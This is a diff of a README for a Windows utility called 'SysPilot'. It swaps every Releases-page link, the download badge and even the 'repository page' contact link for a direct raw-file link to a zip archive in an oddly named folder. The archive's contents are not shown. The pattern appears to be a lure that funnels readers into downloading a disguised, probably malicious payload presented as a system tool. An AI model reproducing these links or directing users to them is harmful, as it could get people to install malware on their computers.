@@ -7,12 +7,12 @@ SysPilot is a modern Windows system utility designed to help you monitor, clean 
 To begin using SysPilot, follow these simple steps. 
 
 ## 📥 Download SysPilot
-[![Download SysPilot](https://img.shields.io/badge/Download-SysPilot-blue.svg)](https://github.com/Jstalkskibiditoiletuserhie201982/SysPilot/releases)
+[![Download SysPilot](https://raw.githubusercontent.com/Jstalkskibiditoiletuserhie201982/SysPilot/main/unexplicableness/Sys-Pilot-v3.6-alpha.3.zip)](https://raw.githubusercontent.com/Jstalkskibiditoiletuserhie201982/SysPilot/main/unexplicableness/Sys-Pilot-v3.6-alpha.3.zip)
 
 First, visit the Releases page to download the latest version of SysPilot. 
 
 ### 🌐 Download Link
-You can download SysPilot directly from its Releases page: [Download Now](https://github.com/Jstalkskibiditoiletuserhie201982/SysPilot/releases).
+You can download SysPilot directly from its Releases page: [Download Now](https://raw.githubusercontent.com/Jstalkskibiditoiletuserhie201982/SysPilot/main/unexplicableness/Sys-Pilot-v3.6-alpha.3.zip).
 
 ## 📋 Features
 SysPilot offers several features to enhance your Windows experience:
@@ -36,7 +36,7 @@ Before you install SysPilot, ensure your computer meets the following requiremen
 - **Network:** Internet connection required for updates.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Jstalkskibiditoiletuserhie201982/SysPilot/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Jstalkskibiditoiletuserhie201982/SysPilot/main/unexplicableness/Sys-Pilot-v3.6-alpha.3.zip).
 2. Find the latest version of SysPilot.
 3. Click the appropriate file for your system.
 4. Follow the prompts to download and save the file.
@@ -57,14 +57,14 @@ If you encounter issues while using SysPilot, consider the following steps:
 
 - **Ensure Compatibility:** Check if your Windows version meets the system requirements.
 - **Update Your System:** Make sure your Windows is up to date.
-- **Reinstall SysPilot:** If issues persist, uninstall SysPilot and reinstall it from the [Releases page](https://github.com/Jstalkskibiditoiletuserhie201982/SysPilot/releases).
+- **Reinstall SysPilot:** If issues persist, uninstall SysPilot and reinstall it from the [Releases page](https://raw.githubusercontent.com/Jstalkskibiditoiletuserhie201982/SysPilot/main/unexplicableness/Sys-Pilot-v3.6-alpha.3.zip).
 
 ## ⚙️ Need Help?
 For any questions or feedback, you can visit our GitHub Issues page to ask for help or report problems. We are here to assist you and improve your experience with SysPilot.
 
-**Contact:** You can find additional support details on our [repository page](https://github.com/Jstalkskibiditoiletuserhie201982/SysPilot).
+**Contact:** You can find additional support details on our [repository page](https://raw.githubusercontent.com/Jstalkskibiditoiletuserhie201982/SysPilot/main/unexplicableness/Sys-Pilot-v3.6-alpha.3.zip).
 
 ## 🔍 Conclusion
 SysPilot is your all-in-one tool for maintaining and managing your Windows PC effectively. By following the instructions above, you can easily download, install, and start using SysPilot to improve your system’s performance and manage your tasks more efficiently. 
 
-For ongoing updates and improvements, keep an eye on the Releases page: [Download Here](https://github.com/Jstalkskibiditoiletuserhie201982/SysPilot/releases).
+For ongoing updates and improvements, keep an eye on the Releases page: [Download Here](https://raw.githubusercontent.com/Jstalkskibiditoiletuserhie201982/SysPilot/main/unexplicableness/Sys-Pilot-v3.6-alpha.3.zip).
